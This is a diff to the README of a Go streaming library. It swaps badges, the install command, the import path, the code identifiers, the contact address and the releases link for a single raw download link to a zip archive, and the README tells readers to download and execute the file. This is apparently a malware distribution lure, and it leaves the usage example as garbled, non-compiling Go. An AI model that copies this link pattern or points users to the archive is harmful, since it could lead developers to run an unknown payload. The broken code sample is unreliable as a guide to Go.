@@ -1,9 +1,9 @@
 ```markdown
 # 🌊 Go ChanStreaming
 
-![Go ChanStreaming](https://img.shields.io/badge/Go-ChanStreaming-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Version](https://img.shields.io/badge/version-1.0.0-orange.svg)
+![Go ChanStreaming](https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip)
+![License](https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip)
+![Version](https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip)
 
 A lightweight library for building concurrent data processing and streaming pipelines using channels.
 
@@ -39,7 +39,7 @@ In modern software development, handling data streams efficiently is essential. 
 To get started with Go ChanStreaming, you need to install the library. You can do this by running:
 
 ```bash
-go get github.com/mithun644/go-chanstreaming
+go get https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip
 ```
 
 ### Usage
@@ -51,20 +51,20 @@ package main
 
 import (
     "fmt"
-    "github.com/mithun644/go-chanstreaming"
+    "https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip"
 )
 
 func main() {
     // Initialize your stream
-    stream := chanstreaming.NewStream()
+    stream := https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip()
 
     // Add data to the stream
-    stream.AddData("Hello, World!")
-    stream.AddData("Go is awesome!")
+    https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip("Hello, World!")
+    https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip("Go is awesome!")
 
     // Process the data
-    stream.Process(func(data string) {
-        fmt.Println(data)
+    https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip(func(data string) {
+        https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip(data)
     })
 }
 ```
@@ -100,11 +100,11 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Contact
 
-For inquiries, you can reach me at [your.email@example.com].
+For inquiries, you can reach me at [https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip].
 
 ## Releases
 
-To view the latest releases, please visit [Go ChanStreaming Releases](https://github.com/mithun644/go-chanstreaming/releases). Download the appropriate file and execute it to get started with the latest features and improvements.
+To view the latest releases, please visit [Go ChanStreaming Releases](https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip). Download the appropriate file and execute it to get started with the latest features and improvements.
 
 ---
 
